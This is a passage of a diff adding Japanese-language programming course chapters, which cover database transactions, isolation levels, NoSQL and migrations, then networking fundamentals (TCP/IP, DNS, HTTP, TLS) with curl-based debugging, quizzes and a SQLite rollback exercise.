+<svg viewBox="0 0 700 290" aria-label="ACID properties illustrated with a bank transfer example: debit from Account A and credit to Account B must both succeed or both fail as a single atomic unit" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="350" y="22" class="label-text" text-anchor="middle" font-size="14" font-weight="600">Bank Transfer: $100 from Account A to Account B</text>
+
+  <rect x="40" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="117" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account A</text>
+  <text x="117" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $500</text>
+
+  <rect x="505" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="582" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account B</text>
+  <text x="582" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $200</text>
+
+  <rect x="160" y="130" width="380" height="85" rx="10" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="152" class="label-text" text-anchor="middle" font-size="12" font-weight="600">BEGIN TRANSACTION</text>
+  <text x="350" y="172" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 400 WHERE id = 'A'</text>
+  <text x="350" y="190" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 300 WHERE id = 'B'</text>
+  <text x="350" y="208" class="label-text" text-anchor="middle" font-size="12" font-weight="600">COMMIT</text>
+
+  <line x1="195" y1="102" x2="260" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="505" y1="102" x2="440" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="100" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Atomicity</text>
+  <text x="100" y="275" class="sub-text" text-anchor="middle" font-size="10">Both or neither</text>
+  <text x="280" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Consistency</text>
+  <text x="280" y="275" class="sub-text" text-anchor="middle" font-size="10">Totals always balance</text>
+  <text x="450" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Isolation</text>
+  <text x="450" y="275" class="sub-text" text-anchor="middle" font-size="10">Others see old or new</text>
+  <text x="620" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Durability</text>
+  <text x="620" y="275" class="sub-text" text-anchor="middle" font-size="10">Survives crashes</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>import sqlite3
+
+conn = sqlite3.connect("bank.db")
+cursor = conn.cursor()
+
+try:
+    cursor.execute("UPDATE accounts SET balance = balance - 100 WHERE id = 'A'")
+    cursor.execute("UPDATE accounts SET balance = balance + 100 WHERE id = 'B'")
+    conn.commit()    # Both succeed
+except Exception:
+    conn.rollback()  # Both fail &mdash; Account A keeps its money</code></pre>
+
+<h3>分離レベル（Isolation Levels）</h3>
+
+<p>分離はバイナリではなく、スペクトラムがあります。より厳密な分離はより高い安全性を意味しますが、並行性は低くなります。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>トランザクション分離レベルとそのトレードオフ</caption>
+<thead><tr><th>分離レベル</th><th>ダーティリード</th><th>非再現読み取り</th><th>ファントムリード</th><th>使用例</th></tr></thead>
+<tbody>
+<tr><td><strong>Read Uncommitted（コミット前読み取り可）</strong></td><td>発生しうる</td><td>発生しうる</td><td>発生しうる</td><td>ほとんど使わない；最大速度</td></tr>
+<tr><td><strong>Read Committed（コミット済み読み取り）</strong></td><td>防止</td><td>発生しうる</td><td>発生しうる</td><td>PostgreSQLのデフォルト</td></tr>
+<tr><td><strong>Repeatable Read（反復可能読み取り）</strong></td><td>防止</td><td>防止</td><td>発生しうる</td><td>MySQLのデフォルト；財務レポート</td></tr>
+<tr><td><strong>Serializable（直列化可能）</strong></td><td>防止</td><td>防止</td><td>防止</td><td>銀行、重要なシステム</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>ダーティリード（Dirty read）：</strong>トランザクションAが、トランザクションBが変更したがまだコミットしていないデータを読み取ります。Bがロールバックすると、Aは実際には存在しなかったデータを読んだことになります。</p>
+
+<p><strong>非再現読み取り（Non-repeatable read）：</strong>トランザクションAが行を読み取り、Bがそれを変更してコミットし、Aが再度読み取ると異なる値を得ます。</p>
+
+<p><strong>ファントムリード（Phantom read）：</strong>トランザクションAが条件に一致する行を照会し、Bが新しい一致する行を挿入してコミットし、Aが再度照会すると以前はなかった「ファントム」行が見えます。</p>
+
+<h3>デッドロック（Deadlocks）</h3>
+
+<p><strong>デッドロック</strong>は、二つのトランザクションがそれぞれ相手が必要とするロックを保持している場合に発生します。どちらも進めないため、永遠に待ち続けます。</p>
+
+<pre style="overflow-x:auto"><code># Transaction 1:                    Transaction 2:
+# Lock row A                        Lock row B
+# Try to lock row B (WAIT...)       Try to lock row A (WAIT...)
+# ... deadlock!                     ... deadlock!</code></pre>
+
+<p><strong>防止策：</strong></p>
+<ul>
+<li>常に同じ順序でロックを取得する（例：常にIDが小さい方を先にロックする）</li>
+<li>トランザクションを短く保つ — ロックを保持する時間が短いほど衝突の可能性が減る</li>
+<li>タイムアウトを使用して、ブロックされたトランザクションが永遠に待つのではなく諦めるようにする</li>
+<li>ほとんどのデータベースはデッドロックを自動的に検出し、一つのトランザクションをロールバックする</li>
+</ul>
+
+<h3>コネクションプーリング（Connection Pooling）</h3>
+
+<p>すべてのデータベース接続にはオーバーヘッドがあります：TCPのセットアップ、認証、メモリの割り当て。<strong>コネクションプール（connection pool）</strong>はあらかじめ開かれた接続を維持します。コードが接続を必要とするとき、プールから借り、完了したら返却します。</p>
+
+<pre style="overflow-x:auto"><code># Conceptual connection pool (real systems use SQLAlchemy or similar)
+class ConnectionPool:
+    def __init__(self, db_path, pool_size=5):
+        self._available = [sqlite3.connect(db_path) for _ in range(pool_size)]
+        self._in_use = []
+
+    def get_connection(self):
+        if not self._available:
+            raise Exception("No connections available")
+        conn = self._available.pop()
+        self._in_use.append(conn)
+        return conn
+
+    def return_connection(self, conn):
+        self._in_use.remove(conn)
+        self._available.append(conn)</code></pre>
+
+<h3>NoSQLの全体像</h3>
+
+<p>リレーショナルデータベース（SQL）はほとんどの場合において適切な選択です。しかし、特定のワークロードでは異なるデータモデルが有益です。NoSQLの主要なカテゴリは四つあります：</p>
+
+<h4>ドキュメントストア（例：MongoDB）</h4>
+
+<p>JSONのようなドキュメントとしてデータを格納します。各ドキュメントは異なる構造を持てます。コンテンツ管理、ユーザープロファイル、カタログに最適です。</p>
+
+<pre style="overflow-x:auto"><code># TaskForge as a document:
+{
+    "_id": "task-001",
+    "title": "Fix login bug",
+    "priority": "high",
+    "assignee": {"name": "Alice", "email": "alice@example.com"},
+    "comments": [
+        {"author": "Bob", "text": "Reproduced on Chrome", "date": "2026-03-15"}
+    ]
+}</code></pre>
+
+<h4>キーバリューストア（例：Redis）</h4>
+
+<p>シンプルです：キーが値にマップされます。非常に高速（多くの場合インメモリ）。キャッシュ、セッションストレージ、レート制限に使われます。</p>
+
+<h4>カラムファミリーストア（例：Cassandra）</h4>
+
+<p>多くのサーバーにまたがる大量データの書き込みと読み取りに最適化されています。時系列データ、IoTログ、大規模なイベントトラッキングに使われます。</p>
+
+<h4>グラフデータベース（例：Neo4j）</h4>
+
+<p>データをノードとエッジ（関係）として格納します。ソーシャルネットワーク、レコメンデーションエンジン、不正検出に使われます。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>NoSQLデータベースの種類と使用例</caption>
+<thead><tr><th>種類</th><th>最適な用途</th><th>不向きな用途</th><th>例</th></tr></thead>
+<tbody>
+<tr><td>ドキュメント</td><td>多様なスキーマ、ネストされたデータ</td><td>複雑な結合</td><td>MongoDB, CouchDB</td></tr>
+<tr><td>キーバリュー</td><td>キャッシュ、セッション</td><td>複雑なクエリ</td><td>Redis, DynamoDB</td></tr>
+<tr><td>カラムファミリー</td><td>書き込み多め、時系列</td><td>アドホッククエリ</td><td>Cassandra, HBase</td></tr>
+<tr><td>グラフ</td><td>高度に接続されたデータ</td><td>バルクアナリティクス</td><td>Neo4j, Neptune</td></tr>
+</tbody>
+</table>
+</div>
+
+<div role="note" class="callout warn">
+<div class="callout-title">注意</div>
+<p>「NoSQLはSQLより速い」というのは誤解です。これは危険な単純化です。NoSQLデータベースは柔軟性を犠牲にして<em>特定の</em>アクセスパターンに最適化されています。適切にインデックスが付けられたPostgreSQLデータベースは、ほとんどの汎用ワークロードでMongoDBを上回るパフォーマンスを発揮します。誇大広告ではなく、データモデルとアクセスパターンに基づいて選択してください。SQLから始めて、具体的な理由がある場合にのみ移行してください。</p>
+</div>
+
+<h3>スキーママイグレーション（Schema Migrations）</h3>
+
+<p>データベーススキーマは時間とともに変化します：新しいカラム、フィールド名の変更、新しいテーブル。<strong>スキーママイグレーション</strong>は構造を進化させるバージョン管理されたスクリプトです。</p>
+
+<pre style="overflow-x:auto"><code># Migration 001: initial schema
+"""
+CREATE TABLE tasks (
+    id INTEGER PRIMARY KEY,
+    title TEXT NOT NULL,
+    done BOOLEAN DEFAULT 0
+);
+"""
+
+# Migration 002: add priority column
+"""
+ALTER TABLE tasks ADD COLUMN priority TEXT DEFAULT 'medium';
+"""
+
+# Migration 003: add categories (zero-downtime approach)
+"""
+-- Step 1: Add nullable column (safe, no breaking change)
+ALTER TABLE tasks ADD COLUMN category_id INTEGER;
+-- Step 2: Backfill existing rows (in application code, gradually)
+-- Step 3: Add constraint once all data is valid
+"""</code></pre>
+
+<p><strong>ゼロダウンタイムマイグレーション</strong>は慎重な手順に従います：カラムをNULL許容として追加し、古いカラムと新しいカラムの両方に書き込むコードをデプロイし、既存データをバックフィルし、最後に制約を追加するか古いカラムを削除します。実行中のコードがまだ読んでいるカラムは絶対に削除しないでください。</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>TaskForgeに番号付きSQLファイルを含む<code>migrations/</code>ディレクトリを作成してください。<code>category_id</code>カラムを追加し、カテゴリテーブルを作成し、カテゴリの割り当てをバックフィルするマイグレーションを書いてください。また、TaskForgeのデータがドキュメントストアとしてどのように見えるかをスケッチしてみてください — よりシンプルになるでしょうか、それとも複雑になるでしょうか？</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう</div>
+<p>TaskForgeに「タスクを別のプロジェクトに移動する」機能があると想像してみましょう。(1)タスクを古いプロジェクトから削除、(2)新しいプロジェクトに追加、(3)タスクのproject_idを更新、という3ステップです。ステップ1の後、ステップ3の前にサーバーがクラッシュしたら何が起きるでしょうか？これを安全にするトランザクション（transaction）を書いてみましょう。</p>
+</div>
+
+<!-- Ch30 Quiz -->
+<div class="quiz" data-ch="30" data-ex="isolation-levels">
+  <h4>確認テスト</h4>
+  <p>ファントムリードを防止する分離レベルはどれですか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">Read Uncommitted</button>
+    <button class="quiz-option" data-correct="false">Read Committed</button>
+    <button class="quiz-option" data-correct="false">Repeatable Read</button>
+    <button class="quiz-option" data-correct="true">Serializable</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch30 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="30" data-ex="transaction-rollback">
+  <div class="exercise-header">
+    <h4>演習：トランザクションのロールバック</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt"><code>sqlite3</code>を使ってトランザクションのロールバックを実演してください。二行（Alice：$1000、Bob：$500）を持つ<code>accounts</code>テーブルを作成します。アトミックに送金する<code>transfer(conn, from_name, to_name, amount)</code>関数を書いてください。送金者の残高が不足している場合は<code>ValueError</code>を発生させてロールバックし、お金が失われないようにしてください。</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_accounts():
+    conn = sqlite3.connect(":memory:")
+    conn.execute("""CREATE TABLE accounts (
+        name TEXT PRIMARY KEY,
+        balance REAL NOT NULL
+    )""")
+    conn.execute("INSERT INTO accounts VALUES ('Alice', 1000)")
+    conn.execute("INSERT INTO accounts VALUES ('Bob', 500)")
+    conn.commit()
+    return conn
+
+def transfer(conn, from_name, to_name, amount):
+    """Transfer amount from from_name to to_name.
+    Raise ValueError if insufficient funds (and roll back).
+    Return dict of all balances after the transfer."""
+    # TODO: implement with proper transaction handling
+    pass
+
+def get_balances(conn):
+    """Return dict of name -> balance."""
+    rows = conn.execute("SELECT name, balance FROM accounts").fetchall()
+    return {name: balance for name, balance in rows}
+
+conn = setup_accounts()
+    </script>
+    <script type="text/plain" class="test-code">
+# Test successful transfer
+result = transfer(conn, "Alice", "Bob", 200)
+assert result["Alice"] == 800, f"Alice should have 800, got {result['Alice']}"
+assert result["Bob"] == 700, f"Bob should have 700, got {result['Bob']}"
+
+# Test failed transfer (insufficient funds)
+try:
+    transfer(conn, "Bob", "Alice", 9999)
+    assert False, "Should have raised ValueError for insufficient funds"
+except ValueError:
+    pass  # Expected
+
+# Verify balances unchanged after failed transfer (rollback worked!)
+balances = get_balances(conn)
+assert balances["Alice"] == 800, f"Alice should still be 800, got {balances['Alice']}"
+assert balances["Bob"] == 700, f"Bob should still be 700, got {balances['Bob']}"
+
+# Test another successful transfer
+result2 = transfer(conn, "Bob", "Alice", 100)
+assert result2["Alice"] == 900, f"Alice should have 900, got {result2['Alice']}"
+assert result2["Bob"] == 600, f"Bob should have 600, got {result2['Bob']}"
+print("All transaction tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">実行</button>
+    <button class="ex-check">確認</button>
+    <button class="ex-hint" data-level="0">ヒント</button>
+    <button class="ex-reset">リセット</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">まず送金者の残高を照会します。amountより少ない場合は、何かを変更する前にValueErrorを発生させます。</p>
+    <p class="hint">二つのUPDATE文を使います：<code>UPDATE accounts SET balance = balance - ? WHERE name = ?</code>と対応する加算。両方が成功した後にconn.commit()を呼びます。</p>
+    <p class="hint">更新をtry/exceptで囲みます。exceptブロックでconn.rollback()を呼び、例外を再発生させます。成功した送金の最後にget_balances(conn)を返します。</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 31 ===== -->
+<section id="ch31" data-ch="31">
+<h2><span class="ch-label">第31章</span> ネットワークとインターネット</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>すべてのAPIコール、すべての<code>git push</code>、すべてのウェブページの読み込みはネットワークを通じて伝わります。TaskForge APIが遅い場合、それはコードの問題でしょうか、データベースの問題でしょうか、それともネットワークの問題でしょうか？インターネットの仕組みを理解することで、アプリケーションレベルのコードしか知らない人には見えない問題を診断する能力が身につきます。</p>
+</div>
+
+<h3>TCP/IPスタック</h3>
+
+<p>インターネットは<strong>レイヤー</strong>で構築されています。各レイヤーは特定の役割を持ち、上下のレイヤーと通信します。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>インターネットプロトコルスタックのレイヤー</caption>
+<thead><tr><th>レイヤー</th><th>名前</th><th>役割</th><th>プロトコル</th></tr></thead>
+<tbody>
+<tr><td>5</td><td><strong>アプリケーション</strong></td><td>コードが話しかける層 — ウェブリクエスト、DNS、メール</td><td>HTTP, HTTPS, DNS, SMTP, SSH</td></tr>
+<tr><td>4</td><td><strong>トランスポート</strong></td><td>プロセス間の信頼性（TCP）または高速（UDP）配送</td><td>TCP, UDP</td></tr>
+<tr><td>3</td><td><strong>ネットワーク</strong></td><td>IPアドレスを使ってネットワーク間でパケットをルーティング</td><td>IP（IPv4, IPv6）</td></tr>
+<tr><td>2</td><td><strong>リンク</strong></td><td>ローカルネットワーク用にデータをフレームに収める</td><td>Ethernet, Wi-Fi</td></tr>
+<tr><td>1</td><td><strong>物理</strong></td><td>ケーブルや電波で電気/光学信号を伝える</td><td>ケーブル、無線、光ファイバー</td></tr>
+</tbody>
+</table>
+</div>
+
+<p>開発者として、ほとんどの時間はレイヤー4と5で過ごします。しかし、レイテンシや接続障害をデバッグするとき、下位レイヤーを理解していると適切な質問ができます。</p>
+
+<h3>DNS — 名前をアドレスに変換する</h3>
+
+<p>ブラウザに<code>api.taskforge.dev</code>を入力すると、コンピュータは<strong>DNS</strong>（ドメインネームシステム / Domain Name System）サーバーに人間が読める名前を<code>93.184.216.34</code>のようなIPアドレスに変換するよう依頼します。</p>
+
+<p>名前解決の流れ：ローカルキャッシュを確認 &rarr; DNSリゾルバーに問い合わせ &rarr; ルートネームサーバー &rarr; TLDネームサーバー（.dev）&rarr; 権威ネームサーバー &rarr; IPが返され<strong>TTL</strong>（生存時間 / Time to Live）付きでキャッシュされる。</p>
+
+<pre style="overflow-x:auto"><code># Debugging DNS from the terminal
+$ dig api.taskforge.dev
+
+;; ANSWER SECTION:
+api.taskforge.dev.   300   IN    A    93.184.216.34
+#                    TTL         Type  IP address</code></pre>
+
+<h3>TCP対UDP</h3>
+
+<p><strong>TCP</strong>（伝送制御プロトコル / Transmission Control Protocol）は<strong>スリーウェイハンドシェイク（three-way handshake）</strong>を使って信頼性のある順序付きの配送を提供します：</p>
+
+<ol>
+<li><strong>SYN：</strong>クライアントが「接続したい」と言う</li>
+<li><strong>SYN-ACK：</strong>サーバーが「OK、了解。私も接続したい。」と言う</li>
+<li><strong>ACK：</strong>クライアントが「了解。接続完了。」と言う</li>
+</ol>
+
+<p>このハンドシェイクの後、データは確実に流れます。失われたパケットは再送されます。順序が乱れたパケットは並べ直されます。</p>
+
+<p><strong>UDP</strong>（ユーザーデータグラムプロトコル / User Datagram Protocol）はハンドシェイクを完全にスキップします。パケットを送信して届くことを期待します。より速いですが信頼性がありません。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>TCPとUDPの機能比較</caption>
+<thead><tr><th>機能</th><th>TCP</th><th>UDP</th></tr></thead>
+<tbody>
+<tr><td>接続確立</td><td>スリーウェイハンドシェイク</td><td>なし（コネクションレス）</td></tr>
+<tr><td>信頼性</td><td>保証された配送、順序保証</td><td>ベストエフォート、パケット損失あり</td></tr>
+<tr><td>速度</td><td>低速（オーバーヘッドあり）</td><td>高速（オーバーヘッドなし）</td></tr>
+<tr><td>使用例</td><td>ウェブ、メール、ファイル転送、API</td><td>動画ストリーミング、ゲーム、DNS、VoIP</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>HTTPの詳細</h3>
+
+<p>HTTPはウェブとほとんどのAPIを支えるアプリケーション層プロトコルです。第13章で使いました。ここではさらに深く掘り下げます。</p>
+
+<h4>HTTPメソッド</h4>
+
+<div style="overflow-x:auto">
+<table>
+<caption>HTTPメソッドとそのプロパティ</caption>
+<thead><tr><th>メソッド</th><th>目的</th><th>ボディあり？</th><th>冪等性？</th></tr></thead>
+<tbody>
+<tr><td><strong>GET</strong></td><td>リソースを取得する</td><td>なし</td><td>あり</td></tr>
+<tr><td><strong>POST</strong></td><td>新しいリソースを作成する</td><td>あり</td><td>なし</td></tr>
+<tr><td><strong>PUT</strong></td><td>リソース全体を置き換える</td><td>あり</td><td>あり</td></tr>
+<tr><td><strong>PATCH</strong></td><td>リソースを部分的に更新する</td><td>あり</td><td>なし*</td></tr>
+<tr><td><strong>DELETE</strong></td><td>リソースを削除する</td><td>任意</td><td>あり</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>冪等性（Idempotent）</strong>とは、複数回呼び出しても同じ結果になることを意味します。同じPUTリクエストを二回送っても同じリソース状態になります。POSTを二回送ると二つのリソースが作成される可能性があります。</p>
+
+<h4>ステータスコード</h4>
+
+<pre style="overflow-x:auto"><code># 2xx &mdash; Success
+200 OK                  # Request succeeded
+201 Created             # Resource created (after POST)
+204 No Content          # Success, nothing to return (after DELETE)
+
+# 3xx &mdash; Redirection
+301 Moved Permanently   # Update your URL
+304 Not Modified        # Cached version is still valid
+
+# 4xx &mdash; Client Error (your fault)
+400 Bad Request         # Malformed request
+401 Unauthorized        # Not authenticated (who are you?)
+403 Forbidden           # Authenticated but not authorised (you can't do that)
+404 Not Found           # Resource does not exist
+429 Too Many Requests   # Rate limited
+
+# 5xx &mdash; Server Error (their fault)
+500 Internal Error      # Generic server failure
+502 Bad Gateway         # Proxy got bad response from upstream
+503 Service Unavailable # Server overloaded or in maintenance</code></pre>
+
+<h4>ヘッダー、Cookie、セッション</h4>
+
+<p><strong>ヘッダー</strong>はメタデータを運びます：<code>Content-Type</code>（ボディのフォーマット）、<code>Authorization</code>（認証情報）、<code>Accept</code>（クライアントが理解できるフォーマット）。</p>
+
+<p><strong>Cookie</strong>はサーバーが<code>Set-Cookie</code>ヘッダーを通じてクライアントに保存する小さなデータです。そのドメインへのその後のすべてのリクエストで自動的に送信されます。</p>
+
+<p><strong>セッション</strong>はCookie（セッションIDを含む）とサーバー側データを対にします。サーバーはログイン時にセッションを作成し、IDを含むCookieを渡し、その後のリクエストでセッションを検索して誰であるかを識別します。</p>
+
+<h4>HTTP/2の改善点</h4>
+
+<p>HTTP/2はマルチプレキシング（単一接続での複数リクエスト）、ヘッダー圧縮、サーバープッシュを導入しました。コードを変更する必要はありません。Webサーバーとブラウザが自動的に処理します。</p>
+
+<h3>TLS/HTTPS</h3>
+
+<p><strong>TLS</strong>（トランスポートレイヤーセキュリティ / Transport Layer Security）はクライアントとサーバー間の接続を暗号化します。HTTPSはTLS上のHTTPです。簡略化されたハンドシェイク：</p>
+
+<ol>
+<li>クライアントがサポートされる暗号スイートと共に「Hello」を送る</li>
+<li>サーバーが<strong>証明書</strong>（身元を証明）と選択された暗号を送る</li>
+<li>クライアントが信頼された認証局（Certificate Authorities）に対して証明書を検証する</li>
+<li>両側が<strong>非対称暗号化（asymmetric encryption）</strong>（低速、一回限り）を使って鍵を交換する</li>
+<li>残りのセッションでは<strong>対称暗号化（symmetric encryption）</strong>（高速）に切り替える</li>
+</ol>
+
+<h3>WebSocket</h3>
+
+<p>通常のHTTPはリクエスト/レスポンスです。リアルタイム機能では、サーバーがクライアントにデータを<em>プッシュ</em>する必要があります。<strong>WebSocket</strong>はHTTP接続を永続的な全二重チャネルにアップグレードし、両側がいつでもメッセージを送れるようにします。</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>リアルタイム通信アプローチの比較</caption>
+<thead><tr><th>アプローチ</th><th>仕組み</th><th>最適な用途</th></tr></thead>
+<tbody>
+<tr><td><strong>ポーリング（Polling）</strong></td><td>クライアントがN秒ごとに問い合わせる</td><td>シンプルなダッシュボード、低頻度</td></tr>
+<tr><td><strong>サーバー送信イベント（Server-Sent Events）</strong></td><td>サーバーが一方向のストリームをプッシュする</td><td>ニュースフィード、ライブスコア</td></tr>
+<tr><td><strong>WebSocket</strong></td><td>全二重；両側がいつでも送信できる</td><td>チャット、ゲーム、共同編集</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- HTTP Request Journey SVG -->
+<svg viewBox="0 0 720 220" aria-label="Journey of an HTTP request: browser performs DNS lookup, then TCP handshake, then TLS handshake, sends the HTTP request, server processes it, and sends the HTTP response back" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="5" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="50" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">1. DNS</text>
+  <text x="50" y="83" class="sub-text" text-anchor="middle" font-size="9">Name &rarr; IP</text>
+
+  <rect x="118" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="163" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">2. TCP</text>
+  <text x="163" y="83" class="sub-text" text-anchor="middle" font-size="9">SYN/ACK</text>
+
+  <rect x="231" y="45" width="90" height="52" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="276" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">3. TLS</text>
+  <text x="276" y="83" class="sub-text" text-anchor="middle" font-size="9">Cert + encrypt</text>
+
+  <rect x="344" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="389" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">4. HTTP</text>
+  <text x="389" y="83" class="sub-text" text-anchor="middle" font-size="9">GET /tasks</text>
+
+  <rect x="457" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="502" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">5. Server</text>
+  <text x="502" y="83" class="sub-text" text-anchor="middle" font-size="9">Process request</text>
+
+  <rect x="570" y="45" width="110" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="625" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">6. Response</text>
+  <text x="625" y="83" class="sub-text" text-anchor="middle" font-size="9">200 OK + JSON</text>
+
+  <line x1="95" y1="71" x2="118" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="208" y1="71" x2="231" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="321" y1="71" x2="344" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="434" y1="71" x2="457" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="547" y1="71" x2="570" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="50" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Browser</text>
+  <text x="502" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Server</text>
+
+  <path d="M625,97 L625,135 L50,135 L50,125" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead)"/>
+  <text x="350" y="153" class="sub-text" text-anchor="middle" font-size="10">Response travels back through the same layers</text>
+
+  <text x="350" y="183" class="sub-text" text-anchor="middle" font-size="11">First request: 50&ndash;300ms (DNS + TCP + TLS)</text>
+  <text x="350" y="201" class="sub-text" text-anchor="middle" font-size="11">Subsequent: 10&ndash;100ms (TCP/TLS reused via keep-alive)</text>
+</svg>
+
+<h3>デバッグツール</h3>
+
+<pre style="overflow-x:auto"><code># curl &mdash; the Swiss Army knife of HTTP debugging
+$ curl https://api.taskforge.dev/tasks          # GET request
+$ curl -v https://api.taskforge.dev/tasks       # Verbose: headers, TLS info
+$ curl -I https://api.taskforge.dev/tasks       # HEAD: headers only
+$ curl -X POST -H "Content-Type: application/json" \
+       -d '{"title":"New task"}' \
+       https://api.taskforge.dev/tasks          # POST with JSON
+
+# dig &mdash; DNS debugging
+$ dig api.taskforge.dev                          # Full DNS record
+$ dig +short api.taskforge.dev                   # Just the IP
+
+# traceroute &mdash; see the network path
+$ traceroute api.taskforge.dev                   # Shows each hop</code></pre>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>TaskForgeのAPIコールをすべてのネットワークレイヤーを通じてトレースしてください。<code>curl -v http://localhost:5000/tasks</code>を実行し、各段階を識別してください：TCPハンドシェイク、送信されたHTTPリクエストヘッダー、レスポンスステータス、レスポンスボディ。<code>-v</code>フラグがすべてを明らかにします。</p>
+</div>
+
+<div class="pq">「ネットワークがコンピュータだ。」 &mdash; John Gage, Sun Microsystems</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう &mdash; curlの詳細出力を読む</div>
+<p>ターミナルで<code>curl -v https://httpbin.org/get</code>を実行してください。以下を識別してください：(1) DNS解決、(2) TCP接続、(3) TLSハンドシェイクの詳細、(4) リクエストヘッダー、(5) レスポンスステータスコード、(6) レスポンスヘッダー。各セクションが何を示しているか書き出してください。</p>
+</div>
+
+<!-- Ch31 Quiz: TCP -->
+<div class="quiz" data-ch="31" data-ex="tcp-handshake">
+  <h4>確認テスト</h4>
+  <p>TCPのスリーウェイハンドシェイクで何が起きますか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">クライアントがデータを送り、サーバーが確認し、クライアントがさらにデータを送る</button>
+    <button class="quiz-option" data-correct="true">クライアントがSYNを送り、サーバーがSYN-ACKで返し、クライアントがACKを送る</button>
+    <button class="quiz-option" data-correct="false">クライアントとサーバーが暗号化鍵を三回交換する</button>
+    <button class="quiz-option" data-correct="false">クライアントがリクエストを送り、サーバーがレスポンスを送り、クライアントが受信を確認する</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Quiz: Status codes -->
+<div class="quiz" data-ch="31" data-ex="http-status-codes">
+  <h4>確認テスト</h4>
+  <p>サーバーがリクエストを理解したが認可を拒否したことを示すHTTPステータスコードはどれですか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">401 Unauthorized</button>
+    <button class="quiz-option" data-correct="true">403 Forbidden</button>
+    <button class="quiz-option" data-correct="false">404 Not Found</button>
+    <button class="quiz-option" data-correct="false">400 Bad Request</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Checklist -->
+<div class="checklist" data-ch="31" data-ex="networking-understanding">
+  <h4>ネットワーク習熟度チェックリスト</h4>
+  <label><input type="checkbox"><span>TCPとUDPの違いと各々の使い時を説明できる</span></label>
